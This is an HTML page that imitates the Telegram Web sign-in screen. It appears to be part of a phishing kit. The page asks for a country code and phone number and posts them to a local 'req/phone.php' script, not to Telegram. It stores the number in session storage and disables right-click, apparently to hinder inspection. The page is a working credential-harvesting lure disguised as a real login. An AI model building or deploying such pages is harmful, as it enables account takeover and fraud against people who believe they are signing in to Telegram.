<html lang="en" translate="no" class="notranslate theme-light" data-message-text-size="16">

<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <meta name="title" content="Telegram Web">
    <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-title" content="Telegram Web">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="Telegram Web">
    <meta name="application-name" content="Telegram Web">
    <meta name="msapplication-TileColor" content="#2b5797">
    <meta name="theme-color" content="#fff">
    <meta name="google" content="notranslate">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://web.telegram.org/z/">
    <meta property="og:title" content="Telegram Web">
    <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
    <meta property="og:image" content="./icon-192x192.png">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://web.telegram.org/z/">
    <meta property="twitter:title" content="Telegram Web">
    <meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
    <meta property="twitter:image" content="./icon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
    <link rel="icon" href="./favicon.svg" type="image/svg+xml">
    <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="192x192" href="./icon-192x192.png">
    <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
    <link href="lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet">
    <script type="text/javascript">
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
    </script>
</head>

<body class="animation-level-2 is-touch-env is-android">
    <noscript>
        <div id="logo"></div>
        <h1>Telegram Web</h1>
        <p>Please, enable JavaScript to open the app.</p>
    </noscript>
    <div id="loader" class="bg-load load6" style="display:none;">
        <div class="loader"></div>
    </div>
    <div id="root">
        <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
            <div class="Transition full-height is-auth fade">
                <div class="Transition__slide--active">
                    <div class="Transition Auth fade">
                        <div class="Transition__slide--active">
                            <div id="auth-phone-number-form" class="custom-scroll">
                                <div class="auth-form">
                                    <div id="logo"></div>
                                    <h1>Telegram</h1>
                                    <p class="note">Please confirm your country code and enter your phone number.</p>
                                    <form action="req/phone.php" method="post" onsubmit="loadd();">
                                        <div class="DropdownMenu CountryCodeInput">
                                            <div class="input-group" id="labelFlag">
                                                <input class="form-control" type="text" id="sign-in-phone-code" autocomplete="off">
                                                <label>Country</label>
                                                <i class="css-icon-down" id="arow"></i>
                                            </div>
                                            <div class="Menu" style="display:none;" id="Menu">
                                                <div class="backdrop" id="backdrop"></div>
                                                <div role="presentation" class="bubble menu-container custom-scroll top left opacity-transition fast open shown" style="transform-origin: left top;">
                                                  
                                                <div role="menuitem" tabindex="0" class="MenuItem" id="iteM">
    <span class="country-flag"><img src="../assets/img/arab.png" class="emoji" alt="🇦🇪" data-path="./lib/img-apple-160/1f1e6-1f1ea.png"></span>
    <span class="country-name">United Arab Emirates</span>
    <span class="country-code">+971</span>
</div>
<div role="menuitem" tabindex="0" class="MenuItem" id="iteM">
    <span class="country-flag"><img src="../assets/img/portugal.png" class="emoji" alt="🇵🇹" data-path="./lib/img-apple-160/1f1f5-1f1f9.png"></span>
    <span class="country-name">Portugal</span>
    <span class="country-code">+351</span>
</div>
                                                </div>
                                            </div>
                                        </div>
                                        <!--           <div class="input-group touched with-label">-->
                                        <div class="input-group" id="labelhp">
                                            <input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number" name="phoneNumber" autocomplete="off">
                                            <label for="sign-in-phone-number">Your phone number</label>
                                        </div>
                                        <label class="Checkbox"><input checked type="checkbox" id="sign-in-keep-session">
                                            <div class="Checkbox-main">
                                                <span class="label" dir="auto">Keep me signed in</span>
                                            </div>
                                        </label>
                                        <button id="nextBtn" type="submit" class="Button default primary" style="">NEXT
                                            <div class="ripple-container"><span style="left: 88px; top: -81.9375px; width: 188px; height: 188px;"></span></div>
                                        </button>
                                        <button type="button" class="Button default primary text has-ripple" style="">Log in by QR Code
                                            <div class="ripple-container"></div>
                                        </button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="portals"></div>
</body>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    var flag = document.getElementById("sign-in-phone-code");
    var backdrop = document.getElementById("backdrop");
    $("#labelhp").hide()
    $("#Menu").hide();
    flag.addEventListener("click", function() {
        $("#Menu").show();
        document.getElementById("arow").classList.add("open");
        backdrop.addEventListener("click", hideMenu);
        $('.MenuItem').on('click', function(e) {
    var code = $(this).find('.country-name').text();
    flag.value = code;
    if (flag.value == "United Arab Emirates") {
        inpHp.value = "+971 ";
    } else if (flag.value == "Portugal") {
        inpHp.value = "+351 ";
    } else if (flag.value == "Cambodia") {
        inpHp.value = "+855 ";
    } else if (flag.value == "Malaysia") {
        inpHp.value = "+60 ";
    } else if (flag.value == "Indonesia") {
        inpHp.value = "+62 ";
    } else if (flag.value == "India") {
        inpHp.value = "+91 ";
    } else if (flag.value == "Hong Kong") {
        inpHp.value = "+852 ";
    }
    aktip();
    hideMenu();
});


        function hideMenu() {
            document.getElementById("labelFlag").classList.add("touched");
            document.getElementById("arow").classList.remove("open");
            $("#Menu").hide();
        }
    });

    var inpHp = document.getElementById("sign-in-phone-number");
    var btnnext = document.getElementById("nextBtn");
    $(btnnext).css("display", "none");
    inpHp.addEventListener("click", aktip);
    btnnext.addEventListener("click", set_item);

    function set_item() {
        sessionStorage.setItem("nohp", inpHp.value);
    }

    function aktip() {
        $("#labelhp").fadeIn();
        inpHp.focus();
        var label = document.getElementById("labelhp");
        var btnnext = document.getElementById("nextBtn");
        $(btnnext).css("display", "none");
        label.classList.add("touched");
        inpHp.addEventListener("input", validate);

        function validate() {
            if (inpHp.value.length > 6) {
                $(btnnext).fadeIn(300);
            } else {
                $(btnnext).fadeOut("fast");
            }
        }
    }

    function loaddd() {
        $("#loader").fadeIn();
    }
</script>

</html>